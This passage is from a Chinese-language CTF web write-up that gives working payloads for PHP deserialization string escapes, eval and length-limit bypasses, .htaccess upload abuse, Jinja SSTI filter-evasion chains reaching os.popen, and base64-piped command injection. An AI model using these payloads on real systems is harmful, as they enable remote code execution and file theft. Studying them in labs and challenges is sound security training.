class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤后字符增加时</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lemon</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">$lemon = <span class="string">&#x27;/p/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($lemon,<span class="string">&#x27;ww&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$age = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username,$age);</span><br><span class="line">var_dump(serialize($user));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$r = lemon(serialize($user));</span><br><span class="line">var_dump($r);</span><br><span class="line">var_dump(unserialize($r));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### 第一种情况</span></span><br><span class="line">?a=apple时</span><br><span class="line">    </span><br><span class="line"><span class="keyword">string</span>(<span class="number">35</span>) <span class="string">&quot;a:2:&#123;i:0;s:5:&quot;</span>apple<span class="string">&quot;;i:1;s:2:&quot;</span><span class="number">20</span><span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">37</span>) <span class="string">&quot;a:2:&#123;i:0;s:5:&quot;</span>awwwwle<span class="string">&quot;;i:1;s:2:&quot;</span><span class="number">20</span><span class="string">&quot;;&#125;&quot;</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>) <span class="comment">### 报错 不能反序列化</span></span><br><span class="line"><span class="comment">#### 第二种情况</span></span><br><span class="line">   <span class="string">&quot;;i:1;s:2:&quot;</span><span class="number">20</span><span class="string">&quot;;&#125;  16个字符 </span></span><br><span class="line"><span class="string">?a=pppppppppppppppp&quot;</span>;i:<span class="number">1</span>;s:<span class="number">2</span>:<span class="string">&quot;20&quot;</span>;&#125;时</span><br><span class="line">    </span><br><span class="line"><span class="keyword">string</span>(<span class="number">63</span>) <span class="string">&quot;a:2:&#123;i:0;s:32:&quot;</span>pppppppppppppppp<span class="string">&quot;;i:1;s:2:&quot;</span><span class="number">20</span><span class="string">&quot;;&#125;&quot;</span>;i:<span class="number">1</span>;s:<span class="number">2</span>:<span class="string">&quot;20&quot;</span>;&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;br&gt;string(79) &quot;</span>a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">32</span>:<span class="string">&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;</span>;i:<span class="number">1</span>;s:<span class="number">2</span>:<span class="string">&quot;20&quot;</span>;&#125;<span class="string">&quot;;i:1;s:2:&quot;</span><span class="number">20</span><span class="string">&quot;;&#125;&quot;</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;20&quot;</span></span><br><span class="line">&#125; <span class="comment">### 成功反序列化</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤后字符串减少时</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_rep</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> preg_replace( <span class="string">&#x27;/lemon|shy/&#x27;</span>,<span class="string">&#x27;&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test[<span class="string">&#x27;name&#x27;</span>] = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$test[<span class="string">&#x27;sign&#x27;</span>] = $_GET[<span class="string">&#x27;sign&#x27;</span>]; </span><br><span class="line">$test[<span class="string">&#x27;number&#x27;</span>] = <span class="string">&#x27;2020&#x27;</span>;</span><br><span class="line">$tt=serialize($test);</span><br><span class="line"><span class="keyword">echo</span>($tt);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$temp = str_rep($tt);</span><br><span class="line"><span class="keyword">echo</span>($temp);</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$fake = unserialize($temp);</span><br><span class="line">var_dump(($fake));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 第一种情况</span></span><br><span class="line">    name=lemon&amp;sign=gogogo</span><br><span class="line">    a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;lemon&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;sign&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;gogogo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;number&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;2020&quot;</span>;&#125;</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;sign&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;gogogo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;number&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;2020&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>) <span class="comment">#lemon被替换 无法反序列化</span></span><br><span class="line">    <span class="comment">#第二种情况</span></span><br><span class="line">     name=pika&amp;sign=<span class="string">&quot;;s:6:&quot;</span>number<span class="string">&quot;;s:4:&quot;</span><span class="number">2020</span><span class="string">&quot;;&#125;   </span></span><br><span class="line"><span class="string">    a:3 &#123;s:4:&quot;</span>name<span class="string">&quot;;s:4:&quot;</span>pika<span class="string">&quot;;s:4:&quot;</span>sign<span class="string">&quot;;s:27:&quot;</span><span class="string">&quot;;s:6:&quot;</span>number<span class="string">&quot;;s:4:&quot;</span><span class="number">2020</span><span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;number&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;2020&quot;</span>;&#125;</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pika&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;sign&quot;</span>;s:<span class="number">27</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;number&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;2020&quot;</span>;&#125;<span class="string">&quot;;s:6:&quot;</span>number<span class="string">&quot;;s:4:&quot;</span><span class="number">2020</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">array(3) &#123; [&quot;</span>name<span class="string">&quot;]=&gt; string(4) &quot;</span>pika<span class="string">&quot; [&quot;</span>sign<span class="string">&quot;]=&gt; string(27) &quot;</span><span class="string">&quot;;s:6:&quot;</span>number<span class="string">&quot;;s:4:&quot;</span><span class="number">2020</span><span class="string">&quot;;&#125;&quot;</span> [<span class="string">&quot;number&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;2020&quot;</span> &#125;</span><br><span class="line"><span class="comment">#第三种情况</span></span><br><span class="line">    name=shyshyshyshyshyshyshyshyshy&amp;sign=hello123<span class="string">&quot;;s:4:&quot;</span>sign<span class="string">&quot;;s:4:&quot;</span><span class="keyword">eval</span><span class="string">&quot;;s:6:&quot;</span>number<span class="string">&quot;;s:4:&quot;</span><span class="number">2000</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:27:&quot;</span>shyshyshyshyshyshyshyshyshy<span class="string">&quot;;s:4:&quot;</span>sign<span class="string">&quot;;s:57:&quot;</span>hello123<span class="string">&quot;;s:4:&quot;</span>sign<span class="string">&quot;;s:4:&quot;</span><span class="keyword">eval</span><span class="string">&quot;;s:6:&quot;</span>number<span class="string">&quot;;s:4:&quot;</span><span class="number">2000</span><span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;number&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;2020&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">a:<span class="number">3</span>:a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">27</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;sign&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;hello123&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;sign&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;eval&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;number&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;2000&quot;</span>;&#125;<span class="string">&quot;;s:6:&quot;</span>number<span class="string">&quot;;s:4:&quot;</span><span class="number">2020</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array(3) &#123; [&quot;</span>name<span class="string">&quot;]=&gt; string(27) &quot;</span><span class="string">&quot;;s:4:&quot;</span>sign<span class="string">&quot;;s:57:&quot;</span>hello123<span class="string">&quot; [&quot;</span>sign<span class="string">&quot;]=&gt; string(4) &quot;</span><span class="keyword">eval</span><span class="string">&quot; [&quot;</span>number<span class="string">&quot;]=&gt; string(4) &quot;</span><span class="number">2000</span><span class="string">&quot; &#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：changechangechangechangechangechangechange&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/nT2bhM7QjVOFN8s.png" alt="image-20201108222105587"></p><h3 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\(.*\)/&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> (strpos($data, <span class="string">&#x27;flag&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">&#x27;ByeBye hacker&#x27;</span>;</span><br><span class="line">                 <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                 &#125;);</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ?a&#x3D;echo &#96;cat flag.php|base64&#96;;   # 注意最后需要引号，这样是完整的php代码</span><br></pre></td></tr></table></figure><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  &#x3D; &quot;admin&quot;;</span><br><span class="line">$password  &#x3D; &quot;password&quot;;</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$data &#x3D; isset($_POST[&#39;data&#39;])? $_POST[&#39;data&#39;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize &#x3D; unserialize($data);</span><br><span class="line">if ($data_unserialize[&#39;username&#39;]&#x3D;&#x3D;$username&amp;&amp;$data_unserialize[&#39;password&#39;]&#x3D;&#x3D;$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php反序列化  弱等于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag.php里面将username与password修改了因此不能直接序列化</p><p>看代码感觉能直接序列化，但是结果就是不行，才尝试这个方法</p></blockquote><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><p><img src="https://i.loli.net/2020/11/12/1tG2VufTJ8mR5kO.png" alt="image-20201112215551987"></p><p>本题禁止文件中出现某些字符，并且禁止了某些文件名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 .htaccess 攻击 经过测试发现.htaccess可以上传</span><br><span class="line">*** .htaccess 文件内容可以换行输入 </span><br><span class="line">*** 一句话木马也可以简化</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/EAm4nINolJzpdMb.png" alt="image-20201112215939469"></p><p><img src="https://i.loli.net/2020/11/12/4oRyYeV2SNUfjXs.png" alt="image-20201112220014395"></p><h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><h4 id="预备知识SSTI"><a href="#预备知识SSTI" class="headerlink" title="预备知识SSTI"></a>预备知识SSTI</h4><blockquote><p>开始时由于没有学ssti导致一头雾水，网上乱扒payload，结果显然失败（还是自己认真学一下吧）</p></blockquote><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><ol><li>SSTI的解题步骤：找基本类—&gt;找子类—&gt;找可利用的子类模板</li></ol><p>本题过滤了[]  ‘ ‘ “” __</p><blockquote><p>使用   |attr(request.args.value) 绕过</p></blockquote><p>首先查看基本类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原来的语句：&#123;&#123;&#39;&#39;.__class__.base__&#125;&#125;</span><br><span class="line">绕过语句：&#123;&#123;()|attr(request.args.class)|attr(request.args.base)&#125;&#125;&amp;class&#x3D;__class__&amp;base&#x3D;__base__</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/ZfNh8rXKsmwItW6.png" alt="image-20201110223125694"></p><p>找子类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原句：&#123;&#123;&#39;&#39;.__class__.base__.__subclasses__()&#125;&#125;</span><br><span class="line">绕过：&#123;&#123;()|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)()&#125;&#125;&amp;class&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/GmDwX2RiZTyqI9u.png" alt="image-20201110225005807"></p><p>选择某一个子类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原句：&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[199]&#125;&#125;输出第199个</span><br><span class="line">绕过: &#123;&#123;()|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.getitem)(199)&#125;&#125;&amp;&amp;class&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;getitem&#x3D;__getitem__</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/vqSNMkbALn6DQs2.png" alt="image-20201110231227463"></p><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原句:&#123;&#123;warnings.catch_warnings.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat%20&#x2F;flag.txt&#39;).read()&quot;)&#125;&#125;</span><br><span class="line">绕过：&#123;&#123;(()|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.getitem)(166))|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.builtins)|attr(request.args.getitem)(request.args.eval)(request.args.param)&#125;&#125;&amp;class&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;getitem&#x3D;__getitem__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;builtins&#x3D;__builtins__&amp;eval&#x3D;eval&amp;param&#x3D;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/nSrJy95afpuUv4Q.png" alt="image-20201110235346373"></p><blockquote><p>注意细心 千万不要把字母拼错</p></blockquote><h3 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h3><blockquote><p>命令执行 绕过</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;127|sort%09index.php</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/bNUpZqs6fIvegHd.png" alt="image-20201112220350802"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看flag的位置：?url&#x3D;127|ls%09..&#x2F;..&#x2F;..&#x2F;..&#x2F;</span><br><span class="line">获取flag：??url&#x3D;127.0.0|echo%09c29ydCAuLi8uLi8uLi8uLi9mbGFn|base64%09-d|sh</span><br><span class="line"># 使用base64绕过过滤</span><br></pre></td></tr></table></figure><h3 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h3><p><img src="https://i.loli.net/2020/11/14/DsAPdxUfl1pKGHo.png" alt="image-20201114173433689"></p><blockquote><p>此题很玄学  非预期</p></blockquote><h3 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h3><blockquote><p>此题需要找到正确的入口(?action=)</p></blockquote><p>查看源代码</p><p><img src="https://i.loli.net/2020/11/17/HikUYbcWPlmLo3Q.png" alt="image-20201117235651530"></p><p>发现了最后一段为base85编码</p><p><img src="https://i.loli.net/2020/11/17/PhO2oEnmVtM7dQX.png" alt="image-20201117235634186"></p><blockquote><p>此题过滤了base64 所以这里采用  php://filter/convert.quoted-printable-encode/resource=flag.php</p></blockquote><p>获取到了flag.php 再解码</p><p><img src="https://i.loli.net/2020/11/15/KwgAlnCI4TSjhXt.png" alt="image-20201115130752260"></p><p>发现flag是假的，并且看见了提示，使用hex解码</p><p><img src="https://i.loli.net/2020/11/15/Fa3MrlTECSRHvk6.png" alt="image-20201115130847252"></p><p>访问获得源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\\\\&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell_exec&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;ob_start&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/m&#x27;</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;WTF???&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sry,try again&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>目前做到这里就不会了 ， 先空着等之后去学习一下大佬的wp</p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">eval长度限制绕过</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用变长参数特性展开数组</span><br><span class="line">变长参数是PHP5.6新引入的新特性，php中可以使用func(...$arr)这样的方式将$arr数组展开成多个参数传入func函数</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">传入样例：</span><br><span class="line">POST &#x2F;test.php?1[]&#x3D;test&amp;1[]&#x3D;var_dump($_SERVER);&amp;2&#x3D;assert HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">param&#x3D;usort(...$_GET);</span><br><span class="line"></span><br><span class="line">usort() 使用用户定义的比较函数对数组进行排序</span><br><span class="line">usort(array,myfunction)  array 必须填写，规定需要排序的数组</span><br><span class="line">     myfunction  可选，定义了一个可调用的比较函数的字符串</span><br><span class="line">     </span><br><span class="line">GET变量被展开成为了两个参数[&#39;test&#39;,&#39;var_dump($_SERVER)&#39;] 和 assert 传入了usort函数。usort函数的第二个参数是一个回调函数assert，其调用了第一个参数的var_dump($_SERVER),即可执行函数。</span><br></pre></td></tr></table></figure><blockquote><p>开始解题</p></blockquote><p><img src="https://i.loli.net/2020/11/18/AD8K32O9EtQ1wXZ.png" alt="image-20201118000348977"></p><p>获取flag  直接使用 cat /f*</p><p><img src="https://i.loli.net/2020/11/18/3ZCv6k8XKfVhdGI.png" alt="image-20201118001001096"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>SSTI-Study</title>
    <link href="http://example.com/2020/11/12/SSTI-Study/"/>
    <id>http://example.com/2020/11/12/SSTI-Study/</id>
    <published>2020-11-12T11:56:14.000Z</published>
    <updated>2020-12-22T11:43:19.316Z</updated>
    
